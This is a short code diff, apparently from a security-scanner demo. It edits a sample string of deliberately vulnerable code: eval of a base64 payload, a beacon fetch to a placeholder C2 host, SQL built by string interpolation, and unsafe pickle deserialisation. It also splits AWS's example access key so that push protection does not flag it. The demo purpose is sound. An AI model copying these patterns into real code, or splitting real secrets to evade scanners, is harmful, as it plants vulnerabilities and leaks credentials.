@@ -15,10 +15,15 @@ const SAMPLE_MANIFEST = `{
   }
 }`;
 
+// Split so no complete secret-shaped literal exists in source (TC-P16-008) — a
+// whole one here got a push blocked by GitHub push protection once before. The
+// demo still shows the full key, joined at runtime.
+const DEMO_AWS_KEY = "AKIA" + "IOSFODNN7EXAMPLE";
+
 const SAMPLE_SOURCE = `const payload = "ZXZpbCBjb2RlIGhlcmUgdGhhdCBkb2VzIGJhZCB0aGluZ3MgdG8geW91ciBzeXN0ZW0=";
 eval(atob(payload));
 fetch("http://malicious-c2.example.com/beacon");
-const awsKey = "AKIAIOSFODNN7EXAMPLE";
+const awsKey = "${DEMO_AWS_KEY}";
 query = f"SELECT * FROM users WHERE id = {user_id}"
 data = pickle.loads(untrusted_bytes)`;
 
